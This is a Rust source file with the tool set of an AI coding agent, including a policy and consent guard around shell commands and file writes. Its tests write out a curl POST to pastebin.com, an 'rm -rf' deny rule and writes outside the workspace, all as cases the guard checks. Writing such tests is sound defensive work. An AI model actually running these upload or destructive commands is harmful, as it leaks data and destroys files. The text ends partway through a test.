use crate::traits::{Tool, ToolContext, ToolResult, ToolSpec};
use async_trait::async_trait;
use rc_sandbox::{ApprovalDecision, ApprovalRequest, CommandDecision};
use rc_skill::SkillStore;
use serde_json::{json, Value};

fn schema(props: Vec<(&str, Value)>, required: Vec<&str>) -> Value {
    json!({
        "type": "object",
        "properties": props.into_iter().map(|(k, v)| (k.to_string(), v)).collect::<serde_json::Map<_, _>>(),
        "required": required,
    })
}

fn str_arg(args: &Value, key: &str) -> Option<String> {
    args.get(key).and_then(|v| v.as_str()).map(String::from)
}

/// 从 shell 命令里提取 URL(curl 上传检测用)。按空白分词,trim 掉首尾引号
/// 与常见尾随标点,再判断是否为 http(s) 链接。
fn extract_url(command: &str) -> Option<&str> {
    command.split_whitespace().find_map(|w| {
        let w = w.trim_matches(|c| c == '"' || c == '\'' || c == ',' || c == ';' || c == ')');
        if w.starts_with("http://") || w.starts_with("https://") {
            Some(w)
        } else {
            None
        }
    })
}

pub struct ReadFileTool;

#[async_trait]
impl Tool for ReadFileTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "read_file".into(),
            description: "Read a text file, returning its contents with a size cap.".into(),
            input_schema: schema(vec![("path", json!({"type": "string"}))], vec!["path"]),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let Some(path) = str_arg(&args, "path") else {
            return ToolResult::err("missing 'path'");
        };
        let full = ctx.cwd.join(&path);
        match std::fs::read_to_string(&full) {
            Ok(text) => {
                let capped = truncate(&text, ctx.max_output_bytes);
                if capped.len() != text.len() {
                    ToolResult::ok(format!("{capped}\n... [truncated]"))
                } else {
                    ToolResult::ok(capped)
                }
            }
            Err(e) => ToolResult::err(format!("cannot read {}: {e}", full.display())),
        }
    }
}

pub struct WriteFileTool;

#[async_trait]
impl Tool for WriteFileTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "write_file".into(),
            description: "Write text content to a file, overwriting it.".into(),
            input_schema: schema(
                vec![
                    ("path", json!({"type": "string"})),
                    ("content", json!({"type": "string"})),
                ],
                vec!["path", "content"],
            ),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let (Some(path), Some(content)) = (str_arg(&args, "path"), str_arg(&args, "content"))
        else {
            return ToolResult::err("missing 'path' or 'content'");
        };
        if let Err(res) = guard_gate(ctx, "write_file", None, Some(&path)).await {
            return res;
        }
        let full = ctx.cwd.join(&path);
        if let Some(parent) = full.parent() {
            if let Err(e) = std::fs::create_dir_all(parent) {
                return ToolResult::err(format!("cannot create {}: {e}", parent.display()));
            }
        }
        match std::fs::write(&full, &content) {
            Ok(_) => ToolResult::ok(format!(
                "wrote {} ({} bytes)",
                full.display(),
                content.len()
            )),
            Err(e) => ToolResult::err(format!("cannot write {}: {e}", full.display())),
        }
    }
}

pub struct ApplyPatchTool;

#[async_trait]
impl Tool for ApplyPatchTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "apply_patch".into(),
            description: "Edit a file. Modes: whole (replace entire file), hunk (replace first old match), unified (apply a minimal unified diff).".into(),
            input_schema: schema(vec![
                ("mode", json!({"type": "string", "enum": ["whole", "hunk", "unified"]})),
                ("path", json!({"type": "string"})),
                ("content", json!({"type": "string", "description": "whole mode: new content"})),
                ("old", json!({"type": "string", "description": "hunk mode: text to replace"})),
                ("new", json!({"type": "string", "description": "hunk mode: replacement text"})),
                ("patch", json!({"type": "string", "description": "unified mode: diff"})),
            ], vec!["mode", "path"]),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let (Some(mode), Some(path)) = (str_arg(&args, "mode"), str_arg(&args, "path")) else {
            return ToolResult::err("missing 'mode' or 'path'");
        };
        if let Err(res) = guard_gate(ctx, "apply_patch", None, Some(&path)).await {
            return res;
        }
        let full = ctx.cwd.join(&path);
        let text = match std::fs::read_to_string(&full) {
            Ok(t) => t,
            Err(e) => return ToolResult::err(format!("cannot read {}: {e}", full.display())),
        };
        let result = match mode.as_str() {
            "whole" => match str_arg(&args, "content") {
                Some(content) => Ok(content),
                None => Err("missing 'content'".to_string()),
            },
            "hunk" => {
                let (Some(old), Some(new)) = (str_arg(&args, "old"), str_arg(&args, "new")) else {
                    return ToolResult::err("missing 'old' or 'new'");
                };
                match text.find(&old) {
                    Some(pos) => {
                        let mut out = String::new();
                        out.push_str(&text[..pos]);
                        out.push_str(&new);
                        out.push_str(&text[pos + old.len()..]);
                        Ok(out)
                    }
                    None => Err("old text not found".to_string()),
                }
            }
            "unified" => match str_arg(&args, "patch") {
                Some(patch) => apply_unified(&text, &patch).map_err(|e| e.to_string()),
                None => Err("missing 'patch'".to_string()),
            },
            other => Err(format!("unknown mode '{other}'")),
        };
        match result {
            Ok(new_text) => match std::fs::write(&full, &new_text) {
                Ok(_) => ToolResult::ok(format!(
                    "patched {} ({} -> {} bytes)",
                    full.display(),
                    text.len(),
                    new_text.len()
                )),
                Err(e) => ToolResult::err(format!("cannot write {}: {e}", full.display())),
            },
            Err(e) => ToolResult::err(format!("patch failed: {e}")),
        }
    }
}

/// Minimal unified-diff application: hunks starting with `@@`, context lines
/// with a leading space, removals with `-`, additions with `+`.
fn apply_unified(original: &str, patch: &str) -> Result<String, &'static str> {
    let orig_lines: Vec<&str> = original.lines().collect();
    let mut out: Vec<&str> = Vec::new();
    let mut cursor = 0usize;
    let mut applied = false;
    for line in patch.lines() {
        if let Some(header) = line.strip_prefix("@@") {
            // parse " -start,count +start,count" header
            let mut it = header.split_whitespace();
            let _old_range = it.next();
            let _new_range = it.next();
            continue;
        }
        if line.is_empty() {
            continue;
        }
        let (op, content) = line.split_at(1);
        match op {
            " " => {
                if cursor < orig_lines.len() && orig_lines[cursor] == content {
                    out.push(orig_lines[cursor]);
                    cursor += 1;
                } else {
                    return Err("context line mismatch");
                }
            }
            "-" => {
                if cursor < orig_lines.len() && orig_lines[cursor] == content {
                    cursor += 1;
                    applied = true;
                } else {
                    return Err("removal line mismatch");
                }
            }
            "+" => {
                out.push(content);
                applied = true;
            }
            _ => return Err("unknown diff line"),
        }
    }
    out.extend_from_slice(&orig_lines[cursor..]);
    if !applied {
        return Err("empty diff");
    }
    Ok(out.join("\n") + if original.ends_with('\n') { "\n" } else { "" })
}

pub struct RunShellTool;

#[async_trait]
impl Tool for RunShellTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "run_shell".into(),
            description:
                "Run a shell command in the workspace with a policy check and optional approval."
                    .into(),
            input_schema: schema(
                vec![
                    ("command", json!({"type": "string"})),
                    ("timeout_s", json!({"type": "number"})),
                ],
                vec!["command"],
            ),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let Some(command) = str_arg(&args, "command") else {
            return ToolResult::err("missing 'command'");
        };
        // 守卫是比 ask-mode approval 更优先的边界。
        if let Err(res) = guard_gate(ctx, "run_shell", Some(&command), None).await {
            return res;
        }
        let decision = ctx.command_policy.check(&command);
        if let CommandDecision::Denied { reason } = decision {
            return ToolResult::err(format!("command denied by policy: {reason}"));
        }
        if decision == CommandDecision::Allowed {
            return self.execute(command, args, ctx).await;
        }
        let req = ApprovalRequest {
            tool: "run_shell".into(),
            description: command.clone(),
            args: args.clone(),
        };
        match ctx.approval.ask(&req).await {
            ApprovalDecision::Allow => {}
            ApprovalDecision::Deny { reason } => {
                return ToolResult::err(format!("command rejected: {reason}"))
            }
            ApprovalDecision::Edit { args } => {
                return ToolResult::err(format!(
                    "command edit not supported; edited args: {}",
                    args
                ));
            }
        }
        self.execute(command, args, ctx).await
    }
}

impl RunShellTool {
    async fn execute(&self, command: String, args: Value, ctx: &ToolContext) -> ToolResult {
        let timeout_s = args
            .get("timeout_s")
            .and_then(|v| v.as_u64())
            .unwrap_or(120);
        let child = tokio::process::Command::new(shell_program())
            .arg(shell_flag())
            .arg(&command)
            .current_dir(&ctx.cwd)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            // 超时取消(下面的 timeout 触发)时杀掉子进程,否则 wait_with_output 被
            // drop 后 cmd/sleep 之类子进程继续在后台跑(任务泄漏)。
            .kill_on_drop(true)
            .spawn();
        let child = match child {
            Ok(c) => c,
            Err(e) => return ToolResult::err(format!("cannot spawn command: {e}")),
        };
        let output = match tokio::time::timeout(
            std::time::Duration::from_secs(timeout_s),
            child.wait_with_output(),
        )
        .await
        {
            Ok(Ok(o)) => o,
            Ok(Err(e)) => return ToolResult::err(format!("command failed to run: {e}")),
            Err(_) => return ToolResult::err("command timed out"),
        };
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let body = format!(
            "exit={}\n{}\n{}",
            output.status.code().unwrap_or(-1),
            truncate(&stdout, ctx.max_output_bytes),
            truncate(&stderr, 4096)
        );
        if output.status.success() {
            ToolResult::ok(body)
        } else {
            ToolResult::err(body)
        }
    }
}

fn shell_program() -> &'static str {
    if cfg!(windows) {
        "cmd"
    } else {
        "sh"
    }
}

fn shell_flag() -> &'static str {
    if cfg!(windows) {
        "/C"
    } else {
        "-c"
    }
}

/// 监督守卫闸:run_shell / write_file / apply_patch 执行前调用。
/// - 守卫关(`guard_cfg` 为 None)→ Ok(guard off)。
/// - `Allowed` → Ok。
/// - `Denied` → Err(ToolResult::err)。
/// - `NeedsUserApproval` → 会话记忆命中 → Ok;有 hook → 四选一:
///   Once → Ok;Session → 记录记忆 + Ok;Forever → 写回策略文件
///   (`supervise_dir/supervise.toml` 的 allow.high_risk)+ Ok(真实执行继续);
///   写回失败 → Err(ToolResult::err)(操作未执行,不假装成功);
///   Deny(用户拒绝)→ Err(ToolResult::err),等价于拦截;
///   无 hook → Err(ToolResult::err)。
///
/// run_shell 从命令里提取 URL(curl 上传),write_file / apply_patch 无命令 → url 为 None。
async fn guard_gate(
    ctx: &ToolContext,
    tool: &str,
    command: Option<&str>,
    path: Option<&str>,
) -> Result<(), ToolResult> {
    use rc_sandbox::guard::{guard_check, GuardDecision};
    use rc_sandbox::guard_hook::{memo_allows, memo_record, GuardConsent, GuardRequest};
    let Some(cfg) = &ctx.guard_cfg else {
        return Ok(());
    };
    let url = command.and_then(|c| extract_url(c));
    match guard_check(cfg, &ctx.cwd, tool, command, path, url) {
        GuardDecision::Allowed => Ok(()),
        GuardDecision::Denied { reason } => Err(ToolResult::err(format!("guard denied: {reason}"))),
        GuardDecision::NeedsUserApproval { reason } => {
            let req = GuardRequest {
                tool: tool.into(),
                reason,
                command: command.map(String::from),
                path: path.map(String::from),
            };
            // 会话已放行同类 → 直接执行。
            if ctx
                .guard_memo
                .as_ref()
                .map(|m| memo_allows(m, &req))
                .unwrap_or(false)
            {
                return Ok(());
            }
            let Some(hook) = &ctx.guard_hook else {
                return Err(ToolResult::err(format!(
                    "guard: {} (需用户授权)",
                    req.reason
                )));
            };
            match hook.ask(&req).await {
                GuardConsent::Once => Ok(()),
                GuardConsent::Deny => Err(ToolResult::err("guard denied by user")),
                GuardConsent::Session => {
                    if let Some(m) = &ctx.guard_memo {
                        memo_record(m, &req);
                    }
                    Ok(())
                }
                GuardConsent::Forever => {
                    // 永久放行:把该操作实例(命令或路径)写回策略文件 allow.high_risk,
                    // 然后放行真实执行。写回失败 → 明确报错(绝不假装成功)。
                    let what = req
                        .command
                        .clone()
                        .or_else(|| req.path.clone())
                        .unwrap_or_default();
                    if what.trim().is_empty() {
                        return Err(ToolResult::err("guard forever: 无可放行的操作实例"));
                    }
                    match &ctx.supervise_dir {
                        Some(dir) => {
                            if let Err(e) =
                                rc_sandbox::guard::append_allow_high_risk(dir, &what)
                            {
                                return Err(ToolResult::err(format!(
                                    "guard forever 写回失败(操作未执行): {e}"
                                )));
                            }
                            // 持久化成功 → Ok,让工具继续真实执行。
                            Ok(())
                        }
                        None => Err(ToolResult::err(
                            "guard forever: 未配置策略文件目录,永久放行不可用;请用 1=仅本次 / 2=本会话",
                        )),
                    }
                }
            }
        }
    }
}

pub struct ListDirTool;

#[async_trait]
impl Tool for ListDirTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "list_dir".into(),
            description: "List directory entries (one level) with type and size.".into(),
            input_schema: schema(vec![("path", json!({"type": "string"}))], vec!["path"]),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let path = str_arg(&args, "path").unwrap_or_else(|| ".".into());
        let full = ctx.cwd.join(&path);
        let entries = match std::fs::read_dir(&full) {
            Ok(e) => e,
            Err(e) => return ToolResult::err(format!("cannot list {}: {e}", full.display())),
        };
        let mut lines = Vec::new();
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            let ft = entry
                .file_type()
                .map(|t| {
                    if t.is_dir() {
                        "dir "
                    } else if t.is_symlink() {
                        "link"
                    } else {
                        "file"
                    }
                })
                .unwrap_or("???");
            let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
            lines.push(format!("{ft} {size:>10} {name}"));
        }
        lines.sort();
        ToolResult::ok(lines.join("\n"))
    }
}

pub struct GrepTool;

#[async_trait]
impl Tool for GrepTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "grep".into(),
            description: "Search files under a directory with a regex pattern.".into(),
            input_schema: schema(
                vec![
                    ("pattern", json!({"type": "string"})),
                    ("path", json!({"type": "string"})),
                ],
                vec!["pattern"],
            ),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let Some(pattern) = str_arg(&args, "pattern") else {
            return ToolResult::err("missing 'pattern'");
        };
        let path = str_arg(&args, "path").unwrap_or_else(|| ".".into());
        let root = ctx.cwd.join(&path);
        let re = match regex::Regex::new(&pattern) {
            Ok(r) => r,
            Err(e) => return ToolResult::err(format!("invalid regex: {e}")),
        };
        let mut hits = Vec::new();
        for entry in walkdir::WalkDir::new(&root)
            .follow_links(false)
            .into_iter()
            .flatten()
        {
            if !entry.file_type().is_file() {
                continue;
            }
            let Ok(text) = std::fs::read_to_string(entry.path()) else {
                continue;
            };
            for (idx, line) in text.lines().enumerate() {
                if re.is_match(line) {
                    hits.push(format!(
                        "{}:{}:{}",
                        entry
                            .path()
                            .strip_prefix(&ctx.cwd)
                            .unwrap_or(entry.path())
                            .display(),
                        idx + 1,
                        line
                    ));
                    if hits.len() >= 200 {
                        hits.push("... [truncated at 200 matches]".into());
                        return ToolResult::ok(hits.join("\n"));
                    }
                }
            }
        }
        if hits.is_empty() {
            ToolResult::ok("no matches")
        } else {
            ToolResult::ok(hits.join("\n"))
        }
    }
}

pub struct SkillLoadTool {
    store: SkillStore,
}

impl SkillLoadTool {
    pub fn new(store: SkillStore) -> Self {
        Self { store }
    }
}

#[async_trait]
impl Tool for SkillLoadTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "skill".into(),
            description:
                "Load a skill's full SKILL.md into context when a task matches its description."
                    .into(),
            input_schema: schema(vec![("name", json!({"type": "string"}))], vec!["name"]),
        }
    }

    async fn run(&self, args: Value, _ctx: &ToolContext) -> ToolResult {
        let Some(name) = str_arg(&args, "name") else {
            return ToolResult::err("missing 'name'");
        };
        match self.store.load(&name) {
            Some(skill) => ToolResult::ok(
                skill
                    .render()
                    .unwrap_or_else(|_| "skill render failed".into()),
            ),
            None => ToolResult::err(format!("skill '{name}' not found")),
        }
    }
}

pub struct AskUserTool;

#[async_trait]
impl Tool for AskUserTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "ask_user".into(),
            description: "Ask the user a clarifying question when intent, scope or acceptance criteria are uncertain.".into(),
            input_schema: schema(vec![("question", json!({"type": "string"}))], vec!["question"]),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let Some(question) = str_arg(&args, "question") else {
            return ToolResult::err("missing 'question'");
        };
        let answer = ctx.user_input.ask(&question).await;
        if answer.trim().is_empty() {
            ToolResult::err("no user response provided")
        } else {
            ToolResult::ok(answer)
        }
    }
}

/// 子代理工具:主模型按需派一个聚焦子代理做查询/研究/小任务,拿回最终文本。
/// 子代理是"主模型手里的工具"(能派就派,加速完成),由宿主注入 SubagentFn 工厂。
pub struct DelegateResearchTool;

#[async_trait]
impl Tool for DelegateResearchTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "delegate_research".into(),
            description: "Spawn a focused sub-agent to research, look up, verify, or do a small task in parallel, and return its final answer. Use it when a sub-problem can be resolved independently and faster by a helper — like giving a tool to yourself.".into(),
            input_schema: schema(
                vec![
                    ("task", json!({"type": "string"})),
                    ("context", json!({"type": "string"})),
                ],
                vec!["task"],
            ),
        }
    }

    async fn run(&self, args: Value, ctx: &ToolContext) -> ToolResult {
        let Some(task) = str_arg(&args, "task") else {
            return ToolResult::err("missing 'task'");
        };
        let context = str_arg(&args, "context").unwrap_or_default();
        let prompt = if context.is_empty() {
            task.to_string()
        } else {
            format!("{task}\n\nContext:\n{context}")
        };
        let Some(subagent) = &ctx.subagent else {
            return ToolResult::err("sub-agent factory not configured for this session");
        };
        match subagent(prompt).await {
            Ok(text) => ToolResult::ok(text),
            Err(e) => ToolResult::err(format!("sub-agent failed: {e}")),
        }
    }
}

/// Build the standard Raincode tool set.
pub fn default_tools(skill_store: SkillStore) -> Vec<Box<dyn Tool>> {
    vec![
        Box::new(ReadFileTool),
        Box::new(WriteFileTool),
        Box::new(ApplyPatchTool),
        Box::new(RunShellTool),
        Box::new(ListDirTool),
        Box::new(GrepTool),
        Box::new(SkillLoadTool::new(skill_store)),
        Box::new(AskUserTool),
        Box::new(DelegateResearchTool),
    ]
}

fn truncate(s: &str, max: usize) -> String {
    let mut out: String = s.chars().take(max).collect();
    if s.chars().count() > max {
        out.push_str("...");
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::traits::SubagentFn;
    use rc_sandbox::{CommandPolicy, DenyHook};

    #[tokio::test]
    async fn delegate_research_runs_subagent_and_returns_text() {
        use std::sync::Arc;
        let base = ToolContext::new(std::path::PathBuf::from("."), Arc::new(DenyHook));
        let f: Arc<SubagentFn> = Arc::new(|task: String| {
            Box::pin(async move { Ok::<String, String>(format!("RESULT:{task}")) })
        });
        let ctx = ToolContext { subagent: Some(f), ..base };
        let tool = DelegateResearchTool;
        let result = tool.run(serde_json::json!({"task": "查一下 rust"}), &ctx).await;
        assert!(result.ok);
        assert_eq!(result.output, "RESULT:查一下 rust");
    }

    #[tokio::test]
    async fn delegate_research_errors_without_factory() {
        use std::sync::Arc;
        let ctx = ToolContext::new(std::path::PathBuf::from("."), Arc::new(DenyHook));
        let tool = DelegateResearchTool;
        let result = tool.run(serde_json::json!({"task": "x"}), &ctx).await;
        assert!(!result.ok);
        assert!(result.output.contains("not configured"));
    }

    #[test]
    fn unified_patch_applies() {
        let original = "a\nb\nc\n";
        let patch = "@@ -1,3 +1,3 @@\n a\n-b\n+b2\n c\n";
        let out = apply_unified(original, patch).unwrap();
        assert_eq!(out, "a\nb2\nc\n");
    }

    #[test]
    fn hunk_replaces_first_match() {
        let mut text = "hello world\nhello again\n".to_string();
        let old = "hello";
        let pos = text.find(old).unwrap();
        let mut new = String::new();
        new.push_str(&text[..pos]);
        new.push_str("hi");
        new.push_str(&text[pos + old.len()..]);
        text = new;
        assert!(text.starts_with("hi world"));
    }

    #[tokio::test]
    async fn allowed_command_skips_deny_approval() {
        let dir = tempfile::tempdir().unwrap();
        let mut ctx = ToolContext::new(dir.path().to_path_buf(), std::sync::Arc::new(DenyHook));
        ctx.command_policy = CommandPolicy {
            allow: vec!["echo".into()],
            deny: vec![],
        };
        let result = RunShellTool
            .run(json!({"command": "echo hello"}), &ctx)
            .await;
        assert!(result.ok, "{}", result.output);
    }

    #[tokio::test]
    async fn denied_command_is_blocked_before_approval() {
        let dir = tempfile::tempdir().unwrap();
        let mut ctx = ToolContext::new(dir.path().to_path_buf(), std::sync::Arc::new(DenyHook));
        ctx.command_policy = CommandPolicy {
            allow: vec![],
            deny: vec!["rm -rf".into()],
        };
        let result = RunShellTool
            .run(json!({"command": "rm -rf /tmp/x"}), &ctx)
            .await;
        assert!(!result.ok);
        assert!(result.output.contains("denied by policy"));
    }

    /// 全守卫开的配置(default 各守卫关)。
    fn guarded_cfg() -> rc_sandbox::guard::SuperviseConfig {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                upload_to_public: true,
                secrets: true,
            },
            ..Default::default()
        }
    }

    #[test]
    fn guard_check_blocks_outside_workspace_write() {
        use rc_sandbox::guard::{guard_check, GuardDecision};
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        let d = guard_check(&cfg, cwd, "write_file", None, Some("../secret.txt"), None);
        assert!(matches!(d, GuardDecision::NeedsUserApproval { .. }));
    }

    /// Task 2 缺口回归:curl 上传经 run_shell 逃逸守卫 → 必须要求授权。
    #[test]
    fn run_shell_curl_upload_to_public_blocked() {
        use rc_sandbox::guard::{guard_check, GuardDecision};
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        let cmd = "curl -X POST -d 'x=1' https://pastebin.com/api";
        let url = extract_url(cmd);
        let d = guard_check(&cfg, cwd, "run_shell", Some(cmd), None, url);
        assert!(
            matches!(d, GuardDecision::NeedsUserApproval { .. }),
            "curl upload must require user approval"
        );
    }

    #[test]
    fn extract_url_handles_quoted_and_punctuated() {
        assert_eq!(
            extract_url("curl -d 'x=1' \"https://pastebin.com/api\""),
            Some("https://pastebin.com/api")
        );
        assert_eq!(
            extract_url("curl -d 'x=1' https://example.com/upload"),
            Some("https://example.com/upload")
        );
        assert_eq!(extract_url("echo hello"), None);
    }

    /// F5 回归:list_dir 必须相对 ctx.cwd 解析,不能退化成进程 cwd。
    #[tokio::test]
    async fn list_dir_resolves_against_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(inner.join("sub")).unwrap();
        std::fs::write(inner.join("sub/a.txt"), "x").unwrap();
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook));
        let result = ListDirTool.run(json!({"path": "sub"}), &ctx).await;
        assert!(result.ok, "{}", result.output);
        assert!(result.output.contains("a.txt"), "{}", result.output);
    }

    #[tokio::test]
    async fn write_file_guard_blocks_outside_workspace_via_gate() {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(&inner).unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook))
            .with_guard(Some(cfg), None, None);
        let result = WriteFileTool
            .run(json!({"path": "../evil.txt", "content": "x"}), &ctx)
            .await;
        assert!(!result.ok, "{}", result.output);
        assert!(result.output.contains("guard"), "{}", result.output);
    }

    #[tokio::test]
    async fn run_shell_guard_blocks_curl_upload_without_consent() {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                upload_to_public: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let ctx = ToolContext::new(dir.path().to_path_buf(), std::sync::Arc::new(DenyHook))
            .with_guard(Some(cfg), None, None);
        let result = RunShellTool
            .run(json!({"command": "curl -X POST -d 'x=1' https://pastebin.com/api"}), &ctx)
            .await;
        assert!(!result.ok, "{}", result.output);
        assert!(result.output.contains("guard"), "{}", result.output);
    }

    struct AllowOnceHook;
    #[async_trait::async_trait]
    impl rc_sandbox::guard_hook::GuardHook for AllowOnceHook {
        async fn ask(&self, _req: &rc_sandbox::guard_hook::GuardRequest) -> rc_sandbox::guard_hook::GuardConsent {
            rc_sandbox::guard_hook::GuardConsent::Once
        }
    }

    #[tokio::test]
    async fn write_file_guard_allows_on_once_consent() {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(&inner).unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook)).with_guard(
            Some(cfg),
            Some(std::sync::Arc::new(AllowOnceHook)),
            Some(std::sync::Arc::new(rc_sandbox::guard_hook::SessionGuardMemo::default())),
        );
        let result = WriteFileTool
            .run(json!({"path": "../once-ok.txt", "content": "x"}), &ctx)
            .await;
        assert!(result.ok, "{}", result.output);
    }

    struct SessionCounterHook(std::sync::Arc<std::sync::Mutex<usize>>);
    #[async_trait::async_trait]
    impl rc_sandbox::guard_hook::GuardHook for SessionCounterHook {
        async fn ask(&self, _req: &rc_sandbox::guard_hook::GuardRequest) -> rc_sandbox::guard_hook::GuardConsent {
            let mut n = self.0.lock().unwrap();
            *n += 1;
            rc_sandbox::guard_hook::GuardConsent::Session
        }
    }

    #[tokio::test]
    async fn write_file_guard_session_consent_recorded_in_memo() {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(&inner).unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let calls = std::sync::Arc::new(std::sync::Mutex::new(0usize));
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook)).with_guard(
            Some(cfg),
            Some(std::sync::Arc::new(SessionCounterHook(calls.clone()))),
            Some(std::sync::Arc::new(rc_sandbox::guard_hook::SessionGuardMemo::default())),
        );
        let first = WriteFileTool
            .run(json!({"path": "../sess.txt", "content": "x"}), &ctx)
            .await;
        assert!(first.ok, "{}", first.output);
        let second = WriteFileTool
            .run(json!({"path": "../sess.txt", "content": "y"}), &ctx)
            .await;
        assert!(second.ok, "{}", second.output);
        assert_eq!(*calls.lock().unwrap(), 1, "second call must be allowed by memo, not re-asked");
    }

    struct ForeverHook;
    #[async_trait::async_trait]
    impl rc_sandbox::guard_hook::GuardHook for ForeverHook {
        async fn ask(&self, _req: &rc_sandbox::guard_hook::GuardRequest) -> rc_sandbox::guard_hook::GuardConsent {
            rc_sandbox::guard_hook::GuardConsent::Forever
        }
    }

    #[tokio::test]
    async fn write_file_guard_forever_persists_and_proceeds() {
        use rc_sandbox::guard::{append_allow_high_risk, GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(&inner).unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook)).with_guard(
            Some(cfg),
            Some(std::sync::Arc::new(ForeverHook)),
            Some(std::sync::Arc::new(rc_sandbox::guard_hook::SessionGuardMemo::default())),
        );
        let mut ctx = ctx;
        ctx.supervise_dir = Some(dir.path().to_path_buf());
        let result = WriteFileTool
            .run(json!({"path": "../forever.txt", "content": "x"}), &ctx)
            .await;
        // 永久放行写回后,真实执行继续:文件真的被写,且策略文件持久化了该实例。
        assert!(result.ok, "{}", result.output);
        assert!(dir.path().join("forever.txt").exists(), "forever gate must proceed to write");
        // 写回:路径实例进入了 allow.high_risk。
        let persisted = rc_sandbox::guard::load_supervise_config(dir.path()).unwrap();
        assert!(
            persisted.allow.high_risk.iter().any(|a| a == "../forever.txt"),
            "persisted: {:?}",
            persisted.allow.high_risk
        );
        // 幂等性由 append_allow_high_risk 保证(重复调用不产生重复项)。
        append_allow_high_risk(dir.path(), "../forever.txt").unwrap();
        let persisted = rc_sandbox::guard::load_supervise_config(dir.path()).unwrap();
        assert_eq!(
            persisted.allow.high_risk.iter().filter(|a| *a == "../forever.txt").count(),
            1
        );
    }

    #[tokio::test]
    async fn write_file_guard_forever_without_supervise_dir_errors() {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(&inner).unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook)).with_guard(
            Some(cfg),
            Some(std::sync::Arc::new(ForeverHook)),
            Some(std::sync::Arc::new(rc_sandbox::guard_hook::SessionGuardMemo::default())),
        );
        let result = WriteFileTool
            .run(json!({"path": "../forever-no-dir.txt", "content": "x"}), &ctx)
            .await;
        // 未配置策略文件目录 → 永久放行明确报错(绝不假装成功),文件不被写。
        assert!(!result.ok, "{}", result.output);
        assert!(result.output.contains("guard forever"), "{}", result.output);
        assert!(!dir.path().join("forever-no-dir.txt").exists());
    }

    struct DenyConsentHook;
    #[async_trait::async_trait]
    impl rc_sandbox::guard_hook::GuardHook for DenyConsentHook {
        async fn ask(&self, _req: &rc_sandbox::guard_hook::GuardRequest) -> rc_sandbox::guard_hook::GuardConsent {
            rc_sandbox::guard_hook::GuardConsent::Deny
        }
    }

    #[tokio::test]
    async fn write_file_guard_denied_blocks_without_writing() {
        use rc_sandbox::guard::{GuardFlags, SuperviseConfig};
        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("ws");
        std::fs::create_dir_all(&inner).unwrap();
        let cfg = SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                ..Default::default()
            },
            ..Default::default()
        };
        let ctx = ToolContext::new(inner.clone(), std::sync::Arc::new(DenyHook)).with_guard(
